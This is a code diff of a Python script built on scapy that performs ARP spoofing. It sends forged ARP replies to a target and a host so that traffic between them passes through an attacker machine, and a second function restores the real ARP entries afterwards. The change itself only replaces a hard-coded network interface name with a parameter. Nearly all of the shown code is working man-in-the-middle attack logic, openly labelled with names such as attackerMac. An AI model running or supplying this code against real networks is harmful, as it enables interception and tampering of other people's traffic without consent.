@@ -10,7 +10,7 @@ from scapy.all import *
 def spoof(targetIp, hostIp, hardwareinterface):
 
     targetMac = getmacbyip(targetIp)
-    attackerMac = get_if_hwaddr('enp0s10') #get attacker MAC
+    attackerMac = get_if_hwaddr(hardwareinterface) #get attacker MAC
     hostMac = getmacbyip(hostIp)
     
     #send packet "host" to server    
@@ -21,7 +21,7 @@ def spoof(targetIp, hostIp, hardwareinterface):
     arp[ARP].hwdst = targetMac
     arp[ARP].pdst = targetIp
         
-    sendp(arp, iface="enp0s10")
+    sendp(arp, iface=hardwareinterface)
     
     #send packet "server" to host
     arp2 = Ether() / ARP()
@@ -31,10 +31,10 @@ def spoof(targetIp, hostIp, hardwareinterface):
     arp2[ARP].hwdst = hostMac
     arp2[ARP].pdst = hostIp
 
-    sendp(arp2, iface="enp0s10")
+    sendp(arp2, iface=hardwareinterface)
         
         
-def end_spoof(targetIp, hostIp, attackerIp):
+def end_spoof(targetIp, hostIp, attackerIp, hardwareinterface):
         
     targetMac = getmacbyip(targetIp)
     attackerMac = getmacbyip(attackerIp)
@@ -47,7 +47,7 @@ def end_spoof(targetIp, hostIp, attackerIp):
     correctARP[ARP].psrc = hostIp
     correctARP[ARP].hwdst = targetMac
     correctARP[ARP].pdst = targetIp
-    sendp(correctARP, iface="enp0s10")
+    sendp(correctARP, iface=hardwareinterface)
 
 def startspoofing(targetIp, hostIp, hardwareinterface):
 
